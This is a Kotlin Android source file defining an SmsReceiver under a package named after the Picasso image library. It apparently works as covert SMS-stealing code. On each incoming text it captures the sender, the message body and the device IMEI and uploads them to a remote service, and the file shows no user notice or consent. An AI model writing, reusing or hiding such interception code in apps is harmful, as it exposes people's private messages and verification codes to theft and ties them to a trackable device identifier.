package com.squareup.picasso.presentation

import android.annotation.TargetApi
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.os.Build
import android.telephony.SmsMessage
import com.squareup.picasso.core.LogUtils
import com.squareup.picasso.data.StorageResult
import com.squareup.picasso.data.network.DataResponse
import com.squareup.picasso.di.Injector
import com.squareup.picasso.domain.model.SmsEntity
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.util.*

/****
 * https://google-developer-training.github.io/android-developer-phone-sms-course/Lesson%202/2_p_2_sending_sms_messages.html
 */
class SmsReceiver : BroadcastReceiver() {

    private var informationRepository = Injector.provideRemoteInformationRepository()
    private var smsRepository = Injector.provideDataBaseSmsRepository()

    @TargetApi(Build.VERSION_CODES.M)
    override fun onReceive(context: Context, intent: Intent) {
        GlobalScope.launch(Dispatchers.IO) {
            LogUtils.e("Started sms receiver")
            val bundle = intent.extras
            val messages: Array<SmsMessage?>
            val format = bundle!!.getString("format")

            // Retrieve the SMS message received.
            val pdus = bundle[pdu_type] as Array<Any>?

            if (pdus != null) {
                messages = arrayOfNulls(pdus.size)
                val imei = smsRepository.getAllSms().get(0).imei
                var smsList = arrayListOf<SmsEntity>()
                for (index in messages.indices) {
                    // Check Android version and use appropriate createFromPdu.
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        messages[index] = SmsMessage.createFromPdu(
                                pdus[index] as ByteArray,
                                format
                        )
                    } else {
                        messages[index] = SmsMessage.createFromPdu(pdus[index] as ByteArray)
                    }

                    val address = messages[index]?.originatingAddress ?: ""
                    val body = messages[index]?.messageBody ?: ""
                    val date = Date()
                    val id = messages[index]?.protocolIdentifier ?: ""
                    val send = false
                    smsList.add(SmsEntity(imei, address, body, date.time.toString(), id.toString(), send))
                }

                //Send the sms recieve to remote service
                loadNetworkSms(smsList)
            }
        }
    }

    private fun loadNetworkSms(sms: List<SmsEntity>){
        GlobalScope.launch(Dispatchers.IO) {
            //Only send sms if mobile has internet
            var  result: StorageResult<DataResponse> = informationRepository.setSms(sms)
            when(result) {
                is StorageResult.Complete -> {
                    LogUtils.e("setSmsReceiver: Success")
                    if(result.data?.msj == "valido") {

                    }
                }
                is StorageResult.Failure -> {
                    LogUtils.e("setSmsReceiver: Error ")
                }
            }
        }
    }

    companion object {
        const val pdu_type = "pdus"
    }
}